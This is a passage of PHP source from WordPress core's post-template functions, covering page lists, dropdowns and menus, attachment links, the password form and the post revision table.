			$keyt = trim($key);
			if ( '_' == $keyt{0} )
				continue;
			$values = array_map('trim', get_post_custom_values($key));
			$value = implode($values,', ');
			echo apply_filters('the_meta_key', "<li><span class='post-meta-key'>$key:</span> $value</li>\n", $key, $value);
		}
		echo "</ul>\n";
	}
}

//
// Pages
//

/**
 * Retrieve or display list of pages as a dropdown (select list).
 *
 * @since 2.1.0
 *
 * @param array|string $args Optional. Override default arguments.
 * @return string HTML content, if not displaying.
 */
function wp_dropdown_pages($args = '') {
	$defaults = array(
		'depth' => 0, 'child_of' => 0,
		'selected' => 0, 'echo' => 1,
		'name' => 'page_id', 'id' => '',
		'show_option_none' => '', 'show_option_no_change' => '',
		'option_none_value' => ''
	);

	$r = wp_parse_args( $args, $defaults );
	extract( $r, EXTR_SKIP );

	$pages = get_pages($r);
	$output = '';
	$name = esc_attr($name);
	// Back-compat with old system where both id and name were based on $name argument
	if ( empty($id) )
		$id = $name;

	if ( ! empty($pages) ) {
		$output = "<select name=\"$name\" id=\"$id\">\n";
		if ( $show_option_no_change )
			$output .= "\t<option value=\"-1\">$show_option_no_change</option>";
		if ( $show_option_none )
			$output .= "\t<option value=\"" . esc_attr($option_none_value) . "\">$show_option_none</option>\n";
		$output .= walk_page_dropdown_tree($pages, $depth, $r);
		$output .= "</select>\n";
	}

	$output = apply_filters('wp_dropdown_pages', $output);

	if ( $echo )
		echo $output;

	return $output;
}

/**
 * Retrieve or display list of pages in list (li) format.
 *
 * @since 1.5.0
 *
 * @param array|string $args Optional. Override default arguments.
 * @return string HTML content, if not displaying.
 */
function wp_list_pages($args = '') {
	$defaults = array(
		'depth' => 0, 'show_date' => '',
		'date_format' => get_option('date_format'),
		'child_of' => 0, 'exclude' => '',
		'title_li' => __('Pages'), 'echo' => 1,
		'authors' => '', 'sort_column' => 'menu_order, post_title',
		'link_before' => '', 'link_after' => '', 'walker' => '',
	);

	$r = wp_parse_args( $args, $defaults );
	extract( $r, EXTR_SKIP );

	$output = '';
	$current_page = 0;

	// sanitize, mostly to keep spaces out
	$r['exclude'] = preg_replace('/[^0-9,]/', '', $r['exclude']);

	// Allow plugins to filter an array of excluded pages (but don't put a nullstring into the array)
	$exclude_array = ( $r['exclude'] ) ? explode(',', $r['exclude']) : array();
	$r['exclude'] = implode( ',', apply_filters('wp_list_pages_excludes', $exclude_array) );

	// Query pages.
	$r['hierarchical'] = 0;
	$pages = get_pages($r);

	if ( !empty($pages) ) {
		if ( $r['title_li'] )
			$output .= '<li class="pagenav">' . $r['title_li'] . '<ul>';

		global $wp_query;
		if ( is_page() || is_attachment() || $wp_query->is_posts_page )
			$current_page = $wp_query->get_queried_object_id();
		$output .= walk_page_tree($pages, $r['depth'], $current_page, $r);

		if ( $r['title_li'] )
			$output .= '</ul></li>';
	}

	$output = apply_filters('wp_list_pages', $output, $r);

	if ( $r['echo'] )
		echo $output;
	else
		return $output;
}

/**
 * Display or retrieve list of pages with optional home link.
 *
 * The arguments are listed below and part of the arguments are for {@link
 * wp_list_pages()} function. Check that function for more info on those
 * arguments.
 *
 * <ul>
 * <li><strong>sort_column</strong> - How to sort the list of pages. Defaults
 * to page title. Use column for posts table.</li>
 * <li><strong>menu_class</strong> - Class to use for the div ID which contains
 * the page list. Defaults to 'menu'.</li>
 * <li><strong>echo</strong> - Whether to echo list or return it. Defaults to
 * echo.</li>
 * <li><strong>link_before</strong> - Text before show_home argument text.</li>
 * <li><strong>link_after</strong> - Text after show_home argument text.</li>
 * <li><strong>show_home</strong> - If you set this argument, then it will
 * display the link to the home page. The show_home argument really just needs
 * to be set to the value of the text of the link.</li>
 * </ul>
 *
 * @since 2.7.0
 *
 * @param array|string $args
 */
function wp_page_menu( $args = array() ) {
	$defaults = array('sort_column' => 'menu_order, post_title', 'menu_class' => 'menu', 'echo' => true, 'link_before' => '', 'link_after' => '');
	$args = wp_parse_args( $args, $defaults );
	$args = apply_filters( 'wp_page_menu_args', $args );

	$menu = '';

	$list_args = $args;

	// Show Home in the menu
	if ( ! empty($args['show_home']) ) {
		if ( true === $args['show_home'] || '1' === $args['show_home'] || 1 === $args['show_home'] )
			$text = __('Home');
		else
			$text = $args['show_home'];
		$class = '';
		if ( is_front_page() && !is_paged() )
			$class = 'class="current_page_item"';
		$menu .= '<li ' . $class . '><a href="' . home_url( '/' ) . '" title="' . esc_attr($text) . '">' . $args['link_before'] . $text . $args['link_after'] . '</a></li>';
		// If the front page is a page, add it to the exclude list
		if (get_option('show_on_front') == 'page') {
			if ( !empty( $list_args['exclude'] ) ) {
				$list_args['exclude'] .= ',';
			} else {
				$list_args['exclude'] = '';
			}
			$list_args['exclude'] .= get_option('page_on_front');
		}
	}

	$list_args['echo'] = false;
	$list_args['title_li'] = '';
	$menu .= str_replace( array( "\r", "\n", "\t" ), '', wp_list_pages($list_args) );

	if ( $menu )
		$menu = '<ul>' . $menu . '</ul>';

	$menu = '<div class="' . esc_attr($args['menu_class']) . '">' . $menu . "</div>\n";
	$menu = apply_filters( 'wp_page_menu', $menu, $args );
	if ( $args['echo'] )
		echo $menu;
	else
		return $menu;
}

//
// Page helpers
//

/**
 * Retrieve HTML list content for page list.
 *
 * @uses Walker_Page to create HTML list content.
 * @since 2.1.0
 * @see Walker_Page::walk() for parameters and return description.
 */
function walk_page_tree($pages, $depth, $current_page, $r) {
	if ( empty($r['walker']) )
		$walker = new Walker_Page;
	else
		$walker = $r['walker'];

	$args = array($pages, $depth, $r, $current_page);
	return call_user_func_array(array(&$walker, 'walk'), $args);
}

/**
 * Retrieve HTML dropdown (select) content for page list.
 *
 * @uses Walker_PageDropdown to create HTML dropdown content.
 * @since 2.1.0
 * @see Walker_PageDropdown::walk() for parameters and return description.
 */
function walk_page_dropdown_tree() {
	$args = func_get_args();
	if ( empty($args[2]['walker']) ) // the user's options are the third parameter
		$walker = new Walker_PageDropdown;
	else
		$walker = $args[2]['walker'];

	return call_user_func_array(array(&$walker, 'walk'), $args);
}

//
// Attachments
//

/**
 * Display an attachment page link using an image or icon.
 *
 * @since 2.0.0
 *
 * @param int $id Optional. Post ID.
 * @param bool $fullsize Optional, default is false. Whether to use full size.
 * @param bool $deprecated Deprecated. Not used.
 * @param bool $permalink Optional, default is false. Whether to include permalink.
 */
function the_attachment_link( $id = 0, $fullsize = false, $deprecated = false, $permalink = false ) {
	if ( !empty( $deprecated ) )
		_deprecated_argument( __FUNCTION__, '2.5' );

	if ( $fullsize )
		echo wp_get_attachment_link($id, 'full', $permalink);
	else
		echo wp_get_attachment_link($id, 'thumbnail', $permalink);
}

/**
 * Retrieve an attachment page link using an image or icon, if possible.
 *
 * @since 2.5.0
 * @uses apply_filters() Calls 'wp_get_attachment_link' filter on HTML content with same parameters as function.
 *
 * @param int $id Optional. Post ID.
 * @param string $size Optional, default is 'thumbnail'. Size of image, either array or string.
 * @param bool $permalink Optional, default is false. Whether to add permalink to image.
 * @param bool $icon Optional, default is false. Whether to include icon.
 * @param string $text Optional, default is false. If string, then will be link text.
 * @return string HTML content.
 */
function wp_get_attachment_link($id = 0, $size = 'thumbnail', $permalink = false, $icon = false, $text = false) {
	$id = intval($id);
	$_post = & get_post( $id );

	if ( ('attachment' != $_post->post_type) || !$url = wp_get_attachment_url($_post->ID) )
		return __('Missing Attachment');

	if ( $permalink )
		$url = get_attachment_link($_post->ID);

	$post_title = esc_attr($_post->post_title);

	if ( $text ) {
		$link_text = esc_attr($text);
	} elseif ( ( is_int($size) && $size != 0 ) or ( is_string($size) && $size != 'none' ) or $size != false ) {
		$link_text = wp_get_attachment_image($id, $size, $icon);
	} else {
		$link_text = '';
	}

	if( trim($link_text) == '' )
		$link_text = $_post->post_title;

	return apply_filters( 'wp_get_attachment_link', "<a href='$url' title='$post_title'>$link_text</a>", $id, $size, $permalink, $icon, $text );
}

/**
 * Wrap attachment in <<p>> element before content.
 *
 * @since 2.0.0
 * @uses apply_filters() Calls 'prepend_attachment' hook on HTML content.
 *
 * @param string $content
 * @return string
 */
function prepend_attachment($content) {
	global $post;

	if ( empty($post->post_type) || $post->post_type != 'attachment' )
		return $content;

	$p = '<p class="attachment">';
	// show the medium sized image representation of the attachment if available, and link to the raw file
	$p .= wp_get_attachment_link(0, 'medium', false);
	$p .= '</p>';
	$p = apply_filters('prepend_attachment', $p);

	return "$p\n$content";
}

//
// Misc
//

/**
 * Retrieve protected post password form content.
 *
 * @since 1.0.0
 * @uses apply_filters() Calls 'the_password_form' filter on output.
 *
 * @return string HTML content for password form for password protected post.
 */
function get_the_password_form() {
	global $post;
	$label = 'pwbox-'.(empty($post->ID) ? rand() : $post->ID);
	$output = '<form action="' . get_option('siteurl') . '/wp-pass.php" method="post">
	<p>' . __("This post is password protected. To view it please enter your password below:") . '</p>
	<p><label for="' . $label . '">' . __("Password:") . ' <input name="post_password" id="' . $label . '" type="password" size="20" /></label> <input type="submit" name="Submit" value="' . esc_attr__("Submit") . '" /></p>
	</form>
	';
	return apply_filters('the_password_form', $output);
}

/**
 * Whether currently in a page template.
 *
 * This template tag allows you to determine if you are in a page template.
 * You can optionally provide a template name and then the check will be
 * specific to that template.
 *
 * @since 2.5.0
 * @uses $wp_query
 *
 * @param string $template The specific template name if specific matching is required.
 * @return bool False on failure, true if success.
 */
function is_page_template($template = '') {
	if (!is_page()) {
		return false;
	}

	global $wp_query;

	$page = $wp_query->get_queried_object();
	$custom_fields = get_post_custom_values('_wp_page_template',$page->ID);
	$page_template = $custom_fields[0];

	// We have no argument passed so just see if a page_template has been specified
	if ( empty( $template ) ) {
		if (!empty( $page_template ) ) {
			return true;
		}
	} elseif ( $template == $page_template) {
		return true;
	}

	return false;
}

/**
 * Retrieve formatted date timestamp of a revision (linked to that revisions's page).
 *
 * @package WordPress
 * @subpackage Post_Revisions
 * @since 2.6.0
 *
 * @uses date_i18n()
 *
 * @param int|object $revision Revision ID or revision object.
 * @param bool $link Optional, default is true. Link to revisions's page?
 * @return string i18n formatted datetimestamp or localized 'Current Revision'.
 */
function wp_post_revision_title( $revision, $link = true ) {
	if ( !$revision = get_post( $revision ) )
		return $revision;

	if ( !in_array( $revision->post_type, array( 'post', 'page', 'revision' ) ) )
		return false;

	/* translators: revision date format, see http://php.net/date */
	$datef = _x( 'j F, Y @ G:i', 'revision date format');
	/* translators: 1: date */
	$autosavef = __( '%1$s [Autosave]' );
	/* translators: 1: date */
	$currentf  = __( '%1$s [Current Revision]' );

	$date = date_i18n( $datef, strtotime( $revision->post_modified ) );
	if ( $link && current_user_can( 'edit_post', $revision->ID ) && $link = get_edit_post_link( $revision->ID ) )
		$date = "<a href='$link'>$date</a>";

	if ( !wp_is_post_revision( $revision ) )
		$date = sprintf( $currentf, $date );
	elseif ( wp_is_post_autosave( $revision ) )
		$date = sprintf( $autosavef, $date );

	return $date;
}

/**
 * Display list of a post's revisions.
 *
 * Can output either a UL with edit links or a TABLE with diff interface, and
 * restore action links.
 *
 * Second argument controls parameters:
 *   (bool)   parent : include the parent (the "Current Revision") in the list.
 *   (string) format : 'list' or 'form-table'.  'list' outputs UL, 'form-table'
 *                     outputs TABLE with UI.
 *   (int)    right  : what revision is currently being viewed - used in
 *                     form-table format.
 *   (int)    left   : what revision is currently being diffed against right -
 *                     used in form-table format.
 *
 * @package WordPress
 * @subpackage Post_Revisions
 * @since 2.6.0
 *
 * @uses wp_get_post_revisions()
 * @uses wp_post_revision_title()
 * @uses get_edit_post_link()
 * @uses get_the_author_meta()
 *
 * @todo split into two functions (list, form-table) ?
 *
 * @param int|object $post_id Post ID or post object.
 * @param string|array $args See description {@link wp_parse_args()}.
 * @return null
 */
function wp_list_post_revisions( $post_id = 0, $args = null ) {
	if ( !$post = get_post( $post_id ) )
		return;

	$defaults = array( 'parent' => false, 'right' => false, 'left' => false, 'format' => 'list', 'type' => 'all' );
	extract( wp_parse_args( $args, $defaults ), EXTR_SKIP );

	switch ( $type ) {
		case 'autosave' :
			if ( !$autosave = wp_get_post_autosave( $post->ID ) )
				return;
			$revisions = array( $autosave );
			break;
		case 'revision' : // just revisions - remove autosave later
		case 'all' :
		default :
			if ( !$revisions = wp_get_post_revisions( $post->ID ) )
				return;
			break;
	}

	/* translators: post revision: 1: when, 2: author name */
	$titlef = _x( '%1$s by %2$s', 'post revision' );

	if ( $parent )
		array_unshift( $revisions, $post );

	$rows = '';
	$class = false;
	$can_edit_post = current_user_can( 'edit_post', $post->ID );
	foreach ( $revisions as $revision ) {
		if ( !current_user_can( 'read_post', $revision->ID ) )
			continue;
		if ( 'revision' === $type && wp_is_post_autosave( $revision ) )
			continue;

		$date = wp_post_revision_title( $revision );
		$name = get_the_author_meta( 'display_name', $revision->post_author );

		if ( 'form-table' == $format ) {
			if ( $left )
				$left_checked = $left == $revision->ID ? ' checked="checked"' : '';
			else
				$left_checked = $right_checked ? ' checked="checked"' : ''; // [sic] (the next one)
			$right_checked = $right == $revision->ID ? ' checked="checked"' : '';

			$class = $class ? '' : " class='alternate'";

			if ( $post->ID != $revision->ID && $can_edit_post )
				$actions = '<a href="' . wp_nonce_url( add_query_arg( array( 'revision' => $revision->ID, 'action' => 'restore' ) ), "restore-post_$post->ID|$revision->ID" ) . '">' . __( 'Restore' ) . '</a>';
			else
				$actions = '';

			$rows .= "<tr$class>\n";
			$rows .= "\t<th style='white-space: nowrap' scope='row'><input type='radio' name='left' value='$revision->ID'$left_checked /></th>\n";
			$rows .= "\t<th style='white-space: nowrap' scope='row'><input type='radio' name='right' value='$revision->ID'$right_checked /></th>\n";
			$rows .= "\t<td>$date</td>\n";
			$rows .= "\t<td>$name</td>\n";
			$rows .= "\t<td class='action-links'>$actions</td>\n";
			$rows .= "</tr>\n";
		} else {
			$title = sprintf( $titlef, $date, $name );
			$rows .= "\t<li>$title</li>\n";
		}
	}

	if ( 'form-table' == $format ) : ?>

<form action="revision.php" method="get">

<div class="tablenav">
	<div class="alignleft">
		<input type="submit" class="button-secondary" value="<?php esc_attr_e( 'Compare Revisions' ); ?>" />
		<input type="hidden" name="action" value="diff" />
		<input type="hidden" name="post_type" value="<?php echo esc_attr($post->post_type); ?>" />
	</div>
</div>

<br class="clear" />

<table class="widefat post-revisions" cellspacing="0" id="post-revisions">
	<col />
	<col />
	<col style="width: 33%" />
	<col style="width: 33%" />
	<col style="width: 33%" />
<thead>
<tr>
	<th scope="col"><?php /* translators: column name in revisons */ _ex( 'Old', 'revisions column name' ); ?></th>
	<th scope="col"><?php /* translators: column name in revisons */ _ex( 'New', 'revisions column name' ); ?></th>
	<th scope="col"><?php /* translators: column name in revisons */ _ex( 'Date Created', 'revisions column name' ); ?></th>
	<th scope="col"><?php _e( 'Author' ); ?></th>
	<th scope="col" class="action-links"><?php _e( 'Actions' ); ?></th>
</tr>
</thead>
<tbody>

<?php echo $rows; ?>

</tbody>
</table>

</form>

<?php
	else :
		echo "<ul class='post-revisions'>\n";
		echo $rows;
		echo "</ul>";
	endif;

}
